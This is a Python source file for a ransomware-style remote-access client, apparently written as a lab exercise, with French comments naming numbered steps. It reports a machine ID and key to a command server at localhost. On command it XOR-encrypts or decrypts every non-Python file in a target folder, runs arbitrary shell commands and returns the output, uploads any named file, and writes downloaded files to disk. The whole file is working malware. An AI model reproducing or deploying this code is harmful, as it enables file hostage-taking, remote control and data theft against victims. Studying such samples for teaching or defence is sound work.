import socket
import os
import json
import string
import subprocess

C2_IP, C2_PORT = "127.0.0.1", 5000
TARGET_DIR = os.path.expanduser("~/test_folder")

def generate_key_az(size=32):
    alphabet = string.ascii_uppercase
    with open("/dev/urandom", "rb") as f:
        return "".join(alphabet[b % 26] for b in f.read(size))

def get_machine_id():
    with open("/proc/sys/kernel/random/uuid", "r") as f: return f.read().strip()

def xor_cipher(file_path, key):
    key_b = key.encode()
    try:
        with open(file_path, 'rb') as f: data = f.read()
        with open(file_path, 'wb') as f:
            f.write(bytearray(data[i] ^ key_b[i % len(key_b)] for i in range(len(data))))
    except: pass

def run_malware():
    m_id = get_machine_id()
    m_key = generate_key_az(32)
    print(f"[+] Malware actif - ID: {m_id}")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((C2_IP, C2_PORT))
        s.sendall(json.dumps({"id": m_id, "key": m_key}).encode())

        while True:
            data = s.recv(4096).decode()
            if not data: break
            parts = data.split("|")
            cmd = parts[0]

            # 1. Chiffrement / Déchiffrement (Étape 7.3)
            if cmd in ["CRYPT", "DECRYPT"]:
                for root, _, files in os.walk(TARGET_DIR):
                    for f in files:
                        if not f.endswith(".py"): xor_cipher(os.path.join(root, f), m_key)
                print(f"[*] Action {cmd} terminée.")

            # 2. Exécution de commandes (Étape 7.4)
            elif cmd == "EXEC":
                sys_cmd = parts[1]
                # Exécution sans privilèges admin avec retour stdout
                res = subprocess.run(sys_cmd, shell=True, capture_output=True, text=True)
                output = res.stdout + res.stderr
                s.sendall(output.encode() if output else b"Commande executee sans retour.")

            # 3. Upload vers le serveur (Étape 7.1)
            elif cmd == "UPLOAD":
                path = parts[1]
                if os.path.exists(path):
                    with open(path, "rb") as f: s.sendall(f.read())
                else: s.sendall(b"ERROR: Fichier introuvable.")

            # 4. Download depuis le serveur (Étape 7.2)
            elif cmd == "DOWNLOAD":
                filename = parts[1]
                file_data = s.recv(1024*1024*10)
                
                # On retire TARGET_DIR pour enregistrer dans le répertoire d'exécution
                with open(filename, "wb") as f:
                    f.write(file_data)
                print(f"[*] Fichier {filename} reçu et enregistré dans le dossier du client.")

    except Exception as e: print(f"[!] Erreur : {e}")
    finally: s.close()

if __name__ == "__main__":
    if not os.path.exists(TARGET_DIR): os.makedirs(TARGET_DIR)
    run_malware()
